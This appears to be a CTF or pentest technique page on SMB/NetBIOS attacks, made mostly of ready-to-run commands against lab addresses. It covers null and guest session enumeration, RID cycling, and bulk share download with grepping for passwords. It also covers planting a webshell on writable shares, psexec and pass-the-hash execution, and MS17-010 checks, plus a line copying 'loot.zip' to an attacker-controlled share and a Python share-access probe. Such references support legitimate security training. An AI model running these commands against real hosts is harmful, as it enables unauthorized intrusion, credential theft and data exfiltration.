---
title: "SMB / NetBIOS - Enumeration and Exploitation"
category: misc
subcategory: network-services
type: technique
tags: [smb, netbios, smbclient, netexec, crackmapexec, impacket, enum4linux, smbmap, null-session, rid-cycling, eternalblue, ms17-010, psexec, ntlm-relay, enumeration]
difficulty: easy
summary: "Null/guest sessions leak shares and users, RID cycling recovers account names, writable shares and psexec give a foothold; MS17-010 is the classic RCE."
when_to_use:
  - "Ports 139 and/or 445 are open"
  - "You want a user list, share list or password policy before authenticating"
  - "You have a credential/hash and want code execution on a Windows host"
  - "SMB signing is disabled and you are planning an NTLM relay"
cves: [CVE-2017-0144, CVE-2020-0796]
tools: [smbclient, netexec, crackmapexec, impacket, enum4linux-ng, smbmap, nmap]
related: [ad-enumeration-bloodhound, ad-credential-attacks, net-snmp-nfs-rpc-ldap, net-mitm]
---

## TL;DR

SMB is the richest enumeration surface on a Windows box. Try a **null session** and a **guest**
session first -- they often leak shares, users and the password policy for free. RID cycling
recovers usernames even when direct enumeration is blocked. Writable shares, `psexec`-style
execution, and MS17-010 turn enumeration into a shell.

## Recognise it

- nmap: `139/tcp netbios-ssn`, `445/tcp microsoft-ds`.
- `smb-os-discovery` reveals a Windows version, domain and hostname.
- A share named `share`, `backup`, `dev`, `IT`, `transfer` or `SYSVOL`/`NETLOGON` (a domain).

## Attack

### Step 1 -- host and version detection

```bash
# NetBIOS name and workgroup
nmblookup -A 10.10.10.5
nbtscan 10.10.10.5

# OS, domain, signing, SMB dialects
netexec smb 10.10.10.5
nmap -p139,445 --script "smb-os-discovery,smb-security-mode,smb2-security-mode,smb-protocols" 10.10.10.5
```

Note the **signing** line: `signing:False` means this host is an NTLM-relay target.

### Step 2 -- null and guest sessions

```bash
# List shares with a null session (no user, no password)
smbclient -L //10.10.10.5 -N

# Same with a guest account
smbclient -L //10.10.10.5 -U 'guest%'

# netexec null-session share and user enumeration
netexec smb 10.10.10.5 -u '' -p '' --shares --users

# guest session
netexec smb 10.10.10.5 -u 'guest' -p '' --shares

# smbmap shows per-share READ/WRITE permissions in one view
smbmap -H 10.10.10.5 -u '' -p ''
smbmap -H 10.10.10.5 -u guest -p ''
```

### Step 3 -- full null-session enumeration

```bash
# enum4linux-ng: users, groups, shares, policy, OS, all in one
enum4linux-ng -A 10.10.10.5

# Password policy (do this before any spray)
netexec smb 10.10.10.5 -u '' -p '' --pass-pol

# Groups, sessions, logged-on users, disks
netexec smb 10.10.10.5 -u guest -p '' --groups --sessions --loggedon-users --disks
```

### Step 4 -- RID cycling

When `enumdomusers` is blocked, walk the RIDs (500=Administrator, 501=Guest, 1000+=users).

```bash
# netexec brute-forces RIDs and resolves them to names
netexec smb 10.10.10.5 -u guest -p '' --rid-brute 4000

# impacket lookupsid does the same over MS-LSAT
lookupsid.py guest@10.10.10.5 -no-pass

# rpcclient manual RID lookup loop
for i in $(seq 500 1100); do
  rpcclient -U '' -N 10.10.10.5 -c "lookupsids S-1-5-21-DOMAINSID-$i" 2>/dev/null
done
```

### Step 5 -- reading and downloading shares

```bash
# Connect to one share interactively
smbclient //10.10.10.5/share -N

# Non-interactive recursive download of an entire share
smbclient //10.10.10.5/share -N -c 'prompt off; recurse on; mget *'

# smbget mirrors a share tree
smbget -R smb://10.10.10.5/share -U 'guest%'

# Mount for grep-friendly local access
sudo mkdir -p /mnt/smb
sudo mount -t cifs //10.10.10.5/share /mnt/smb -o username=guest,password=,vers=3.0

# Search a downloaded/mounted share for secrets
grep -rniE 'password|passwd|pwd|secret|connectionstring|api[_-]?key' /mnt/smb
```

### Step 6 -- writable shares as a foothold

```bash
# Confirm write access
smbmap -H 10.10.10.5 -u jdoe -p 'Summer2024!' | grep -i write

# Drop a file (e.g. a .scf/.url to coerce auth, or a webshell if the share is a web root)
smbclient //10.10.10.5/uploads -U 'jdoe%Summer2024!' -c 'put shell.aspx'
```

A writable share that is also a web root, a startup folder, or SYSVOL scripts directory is a
direct path to execution.

### Step 7 -- authenticated code execution

```bash
# impacket psexec (creates a service; noisy but reliable) -- SYSTEM shell
psexec.py corp.local/Administrator:'P@ss'@10.10.10.5

# smbexec (no binary dropped, semi-interactive)
smbexec.py corp.local/Administrator:'P@ss'@10.10.10.5

# wmiexec (WMI, quieter, current-user context)
wmiexec.py corp.local/Administrator:'P@ss'@10.10.10.5

# atexec (runs one command via the task scheduler)
atexec.py corp.local/Administrator:'P@ss'@10.10.10.5 whoami

# netexec run a command across many hosts
netexec smb 10.10.10.0/24 -u Administrator -p 'P@ss' -x 'whoami'

# Pass-the-hash instead of a password
psexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 corp.local/Administrator@10.10.10.5
```

### Step 8 -- known SMB vulnerabilities

```bash
# MS17-010 / EternalBlue check (CVE-2017-0144)
nmap -p445 --script smb-vuln-ms17-010 10.10.10.5
netexec smb 10.10.10.5 -M ms17-010

# SMBGhost / CVE-2020-0796 check (SMBv3 compression)
nmap -p445 --script smb-protocols 10.10.10.5   # confirm SMB 3.1.1 first
```

MS17-010 is the reliable one on old CTF boxes; exploit with a vetted public module and verify with
a callback. SMBGhost affects a narrow Windows 10 build range.

### Step 9 -- SMB for file transfer and relay

```bash
# Stand up an SMB server to move files to/from a shell (great for Windows targets)
impacket-smbserver share $(pwd) -smb2support -user a -password a

# From the target: copy a file to your share
# net use \\ATTACKER\share /u:a a  &&  copy loot.zip \\ATTACKER\share\

# Signing off => relay: see net-mitm / ad-credential-attacks for ntlmrelayx
netexec smb 10.10.10.0/24 --gen-relay-list relay-targets.txt
```

## Code

Quick share triage: connect to every listed share with a given credential and report READ/WRITE.

```python
#!/usr/bin/env python3
"""List SMB shares and probe READ/WRITE with smbclient, summarising access.

Requires smbclient in PATH.

Usage:
    python3 smb_share_triage.py 10.10.10.5 [user] [password]
"""
from __future__ import annotations

import re
import subprocess
import sys


def run(args: list[str]) -> str:
    """Run a command, returning combined stdout/stderr, never raising."""
    try:
        proc = subprocess.run(args, capture_output=True, text=True, timeout=30)
        return proc.stdout + proc.stderr
    except (subprocess.TimeoutExpired, FileNotFoundError) as exc:
        return f"__error__ {exc}"


def list_shares(host: str, user: str, password: str) -> list[str]:
    """Return share names from `smbclient -L`."""
    auth = f"{user}%{password}"
    out = run(["smbclient", "-L", f"//{host}", "-U", auth])
    shares = []
    for line in out.splitlines():
        m = re.match(r"\s+(\S+)\s+Disk", line)
        if m and m.group(1) not in ("IPC$",):
            shares.append(m.group(1))
    return shares


def probe(host: str, share: str, user: str, password: str) -> tuple[bool, bool]:
    """Return (readable, writable) for one share."""
    auth = f"{user}%{password}"
    ls = run(["smbclient", f"//{host}/{share}", "-U", auth, "-c", "ls"])
    readable = "NT_STATUS" not in ls and "__error__" not in ls
    writable = False
    if readable:
        put = run(["smbclient", f"//{host}/{share}", "-U", auth, "-c",
                   "put /etc/hostname .smbtest_probe; rm .smbtest_probe"])
        writable = "NT_STATUS_ACCESS_DENIED" not in put and "__error__" not in put
    return readable, writable


def main(argv: list[str]) -> int:
    if len(argv) < 2:
        print(__doc__)
        return 1
    host = argv[1]
    user = argv[2] if len(argv) > 2 else ""
    password = argv[3] if len(argv) > 3 else ""
    shares = list_shares(host, user, password)
    if not shares:
        print("[-] no shares listed (auth failed or none exposed)")
        return 0
    for share in shares:
        readable, writable = probe(host, share, user, password)
        tag = "RW" if writable else ("R-" if readable else "--")
        print(f"[{tag}] {share}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
```

## Variants & pitfalls

- **Null vs guest vs authenticated** are three different access levels -- try all three; some boxes
  block null but allow guest.
- **`smbclient` protocol version.** Old boxes need `-m SMB1` or `--option='client min protocol=NT1'`;
  new boxes want `vers=3.0` on the mount.
- **445 vs 139.** 445 is direct SMB; 139 is SMB over NetBIOS. If 445 is filtered, try 139.
- **RID 500** is always the built-in Administrator even if renamed -- resolve it to learn the real name.
- **psexec drops a service binary** and is loud; prefer `wmiexec` for stealth, but psexec is the
  most reliable for a SYSTEM shell in CTF.
- **MS17-010 can crash the target** -- run it last, and re-check the box is alive afterwards.
- **Signing.** Relay only works against hosts with signing not required; the machine that
  authenticates cannot be the relay target (reflection is patched).

## Tools

- `smbclient`, `smbget`, `smbmap` -- interactive and scripted share access.
- `netexec` / `crackmapexec` -- the enumeration and execution workhorse.
- `enum4linux-ng` -- one-shot null-session enumeration.
- `impacket` -- `psexec/smbexec/wmiexec/atexec`, `lookupsid.py`, `smbserver`.
- `nmap` SMB NSE scripts -- version and vuln checks.

## References

- `[MS-SMB2]` and `[MS-LSAT]` for the protocol behind enumeration and RID lookups.
- Microsoft advisory MS17-010 (CVE-2017-0144) and CVE-2020-0796 (SMBGhost).
- `man smbclient`, `man mount.cifs`.
